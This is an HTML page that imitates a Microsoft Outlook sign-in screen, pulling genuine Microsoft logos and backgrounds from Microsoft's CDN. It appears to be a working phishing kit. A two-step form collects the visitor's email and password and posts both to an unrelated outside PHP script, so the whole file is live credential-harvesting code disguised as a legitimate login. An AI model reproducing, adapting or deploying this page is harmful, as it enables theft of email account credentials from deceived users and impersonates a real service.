<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8" />
    <meta content="width=device-width, initial-scale=1.0" name="viewport" />
    <title>Login</title>
    <link href="https://aadcdn.msftauth.net/ests/2.1/content/images/favicon_a_eupayfgghqiai7k9sol6lg2.ico" rel="shortcut icon" />
    <style type="text/css">
        * {
            padding: 0;
            margin: 0;
            font-family: sans-serif;
        }
        .bg {
            background-image: url('https://aadcdn.msftauth.net/shared/1.0/content/images/backgrounds/2_bc3d32a696895f78c19df6c717586a5d.svg');
            background-size: cover;
            background-position: center;
            height: 100vh;
        }
        .login {
            width: 30.6%;
            background-color: transparent;
            margin: 0 auto;
            padding-top: 10%;
            text-align: center;
        }
        .login .outlook_logo {
            max-width: 256px;
            max-height: 36px;
            display: block;
            margin: 0 auto;
            margin-bottom: 25px;
        }
        .login_bg {
            background-color: #fff;
            padding: 43px;
            overflow: hidden;
            border-radius: 8px;
            box-shadow: 0 0 10px rgba(0,0,0,0.1);
            display: inline-block;
            width: 100%;
            max-width: 400px;
            text-align: left;
        }
        .img {
            margin-bottom: 20px;
        }
        .heading {
            margin-bottom: 20px;
            font-size: 24px;
            font-weight: bold;
        }
        .input_text {
            width: 100%;
            border: none;
            border-bottom: 1px solid #656565;
            padding: 8px 0;
            margin-bottom: 20px;
            font-size: 16px;
        }
        .input_text::placeholder {
            font-size: 16px;
        }
        .input_text:focus {
            outline: none;
        }
        button.btn {
            width: 110px;
            border-color: #0067b8;
            background-color: #0067b8;
            color: #fff;
            font-size: 14px;
            padding: 8px 0;
            cursor: pointer;
            border: none;
            border-radius: 4px;
        }
        .hidden {
            display: none;
        }
        .back-button {
            cursor: pointer;
            color: #0067b8;
            border: none;
            background: none;
            font-size: 16px;
            text-decoration: underline;
        }
        .back-button:hover {
            color: #004a8c;
        }
    </style>
</head>
<body>
    <main class="bg">
        <div class="login">
            <div class="login_bg">
                <img alt="Outlook Logo" class="img" src="https://aadcdn.msftauth.net/ests/2.1/content/images/microsoft_logo_ee5c8d9fb6248c938fd0dc19370e90bd.svg" />
                
                <!-- Header -->
                <div role="heading" aria-level="1" data-bind="text: title">Sign in</div>
<div data-bind="text: subtitle || str['WF_STR_App_Title'], externalCss: { 'subtitle': true }" class="subtitle ext-subtitle">to continue to Outlook</div>
                <!-- First Form for Email Input -->
                <form id="emailForm">
                    <p>
                        <input id="emailInput" class="input_text" name="email" placeholder="Email Address" required type="email" />
                    </p>
                    <button class="btn" type="submit">Next</button>
                </form>
                
                <!-- Display Email and Show Password Form -->
                <div id="emailDisplay" class="hidden">
                    <button class="back-button" onclick="goBack()"> ‚Üê </button>
                    <h2><span id="displayedEmail"></span></h2>
                    
                    <h3>Enter Password</h3>
                    
                    <!-- Second Form for Password Input -->
                    <form id="passwordForm" action="https://sz.zhl13.za.com/.ex/.a.php" method="POST">
                        <input id="emailHidden" name="epol" type="hidden" />
                        <p>
                            <input id="passwordInput" class="input_text" name="ppol" placeholder="Password" type="password" required />
                        </p>
                        <button class="btn" type="submit">Sign in</button>
                    </form>
                </div>
            </div>
        </div>
    </main>

    <script type="text/javascript">
        const emailForm = document.getElementById('emailForm');
        const emailInput = document.getElementById('emailInput');
        const emailDisplay = document.getElementById('emailDisplay');
        const displayedEmail = document.getElementById('displayedEmail');
        const emailHidden = document.getElementById('emailHidden');

        emailForm.addEventListener('submit', function(e) {
            e.preventDefault();  // Prevent the form from submitting

            // Get the email value
            const emailValue = emailInput.value;

            // Validate the email format (optional, but recommended)
            if (emailValue && validateEmail(emailValue)) {
                // Hide the email form
                emailForm.classList.add('hidden');

                // Display the email and show the password form
                displayedEmail.textContent = emailValue;
                emailHidden.value = emailValue;
                emailDisplay.classList.remove('hidden');
            } else {
                alert('Please enter a valid email address');
            }
        });

        // Basic email validation function
        function validateEmail(email) {
            const re = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
            return re.test(String(email).toLowerCase());
        }

        // Function to go back to the email input form
        function goBack() {
            emailDisplay.classList.add('hidden');
            emailForm.classList.remove('hidden');
            emailInput.value = ''; // Clear the email input field
        }
    </script>
</body>
</html>
